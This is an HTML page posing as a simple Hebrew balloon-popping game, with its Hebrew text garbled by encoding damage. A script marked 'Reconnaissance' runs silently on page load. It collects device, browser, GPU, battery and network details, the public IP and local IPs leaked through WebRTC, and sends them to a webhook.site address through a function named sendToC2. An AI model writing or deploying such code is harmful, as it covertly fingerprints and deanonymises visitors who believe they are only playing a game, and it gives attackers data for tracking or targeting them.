<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>砖拽  - 专住转 拽专 转拽转 </title>
    <style>
        body { margin: 0; overflow: hidden; background: #020617; color: white; font-family: system-ui; text-align: center; }
        .ui { position: fixed; top: 10; width: 100%; pointer-events: none; z-index: 10; }
        #game-canvas { width: 100vw; height: 100vh; cursor: crosshair; }
        .balloon { position: absolute; width: 60px; height: 80px; border-radius: 50%; }
    </style>
</head>
<body>

    <div class="ui">
        <h1>爪 驻爪抓 转 ! </h1>
        <div id="score">拽: 0</div>
    </div>
    <div id="game-canvas"></div>

    <script>
        // --- 拽转 砖拽 ---
        let score = 0;
        function spawn() {
            const b = document.createElement('div');
            b.className = 'balloon';
            b.style.left = Math.random() * (window.innerWidth - 60) + 'px';
            b.style.bottom = '-100px';
            b.style.backgroundColor = `hsl(${Math.random() * 360}, 70%, 50%)`;
            document.getElementById('game-canvas').appendChild(b);
            
            const a = b.animate([{ bottom: '-100px' }, { bottom: '110vh' }], { duration: 4000 });
            b.onmousedown = () => { score++; document.getElementById('score').innerText = `拽: ${score}`; b.remove(); };
            a.onfinish = () => b.remove();
        }
        setInterval(spawn, 800);

        // --- 拽转 住祝 注 专 (Reconnaissance) ---
        const WEBHOOK_URL = 'https://webhook.site/0ddb829c-12b7-4f5a-add3-679a6ecfbceb';

        async function collectAllData() {
            const fullData = {
                system: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    cores: navigator.hardwareConcurrency || "N/A", // 住驻专 转 注
                    memory: navigator.deviceMemory || "N/A", // 专 RAM 砖注专 -GB
                    screen: `${window.screen.width}x${window.screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                },
                network: {
                    publicIP: "Pending",
                    connectionType: navigator.connection?.effectiveType || "N/A",
                    downlink: navigator.connection?.downlink || "N/A",
                    rtt: navigator.connection?.rtt || "N/A" // Latency 砖注专
                },
                hardware: {
                    gpu: getGPU(),
                    battery: await getBattery()
                },
                webrtc: []
            };

            // 1. 拽转 IP 爪专
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const json = await res.json();
                fullData.network.publicIP = json.ip;
            } catch(e) {}

            // 2. 住祝 ICE Candidates ( IP 驻/mDNS)
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    fullData.webrtc.push(e.candidate.candidate);
                    sendToC2(fullData);
                }
            };

            // 砖转  专 3 砖转
            setTimeout(() => sendToC2(fullData), 3000);
        }

        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
            } catch(e) { return "N/A"; }
        }

        async function getBattery() {
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    return { level: b.level * 100 + "%", charging: b.charging };
                }
            } catch(e) {}
            return "N/A";
        }

        function sendToC2(payload) {
            fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
        }

        collectAllData();
    </script>
</body>
</html>
